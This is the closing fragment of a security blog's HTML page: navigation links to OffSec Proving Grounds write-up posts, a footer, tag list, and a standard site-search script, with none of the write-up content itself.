href="/blog/posts/oscp-pg-set6/" class="btn btn-outline-primary" aria-label="Older" ><p>OffSec PG - Potato, PyExp, Sar, Seppukku</p></a> <a href="/blog/posts/oscp-pg-set8/" class="btn btn-outline-primary" aria-label="Newer" ><p>OffSec PG - Sunset Decoy, Vegeta1, Wpwn, Y0usef</p></a></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2025</time> <a href="https://twitter.com/etheriosking">Tanishq Rupaal</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Using the <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.2.4" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/blog/tags/home-lab/">home-lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/lab/">lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/productivity/">productivity</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/offsec-proving-grounds/">offsec-proving-grounds</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/oscp/">oscp</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/security/">security</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/aws/">aws</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/container/">container</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/docker/">docker</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/github/">github</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script> document.addEventListener('DOMContentLoaded', () => { SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/blog/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{snippet}</p></article>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); }); </script>
